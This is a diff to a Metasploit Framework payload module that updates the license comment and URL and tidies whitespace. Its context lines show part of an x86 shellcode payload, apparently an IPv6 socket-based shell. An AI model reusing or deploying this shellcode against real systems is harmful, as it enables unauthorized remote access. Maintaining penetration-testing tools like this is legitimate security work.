@@ -5,8 +5,8 @@
 ##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 
@@ -50,7 +50,6 @@ module Metasploit3
 							'SCOPEID'  => [ 58, 'V'    ]
 						},
 					'Payload' =>
-					
 						"\x31\xc0\x50\x40\x50\x6a\x1c\x6a\x61\x58\x50\xcd\x80\xeb\x0e\x59" +
 						"\x6a\x1c\x51\x50\x97\x6a\x62\x58\x50\xcd\x80\xeb\x21\xe8\xed\xff" +
 						"\xff\xff\x1c\x1c\xbf\xbf\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
@@ -61,7 +60,7 @@ module Metasploit3
 			))
 		register_options([
 			OptInt.new('SCOPEID', [false, "IPv6 scope ID, for link-local addresses", 0])
-		])				
+		])
 	end
 
 end
